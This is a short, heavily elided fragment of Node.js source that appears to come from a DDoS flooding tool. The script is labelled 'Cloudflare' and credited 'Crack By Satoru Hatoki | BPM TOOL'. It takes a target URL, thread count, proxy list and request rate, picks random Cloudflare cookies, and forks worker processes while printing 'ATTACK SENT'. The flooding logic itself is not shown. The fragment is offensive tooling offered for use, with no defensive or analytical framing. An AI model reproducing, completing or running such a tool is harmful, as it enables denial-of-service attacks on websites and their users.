...
module.exports = function Cloudflare() {
 ...
 if (process.argv.length < 8){console.log(`Https GET <Time (300)> <Threads (111)> <Proxys> <RQ/S (200)> <Targets (url)>\nCrack By Satoru Hatoki`); process.exit();}
 const headers = {};
...
const CookieCf = cookie[Math.floor(Math.random() * cookie.length)];
 ...
 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
        console.clear()
        console.log(`HTTPS | ATTACK SENT`)
        console.log(`Crack By Satoru Hatoki | BPM TOOL`)
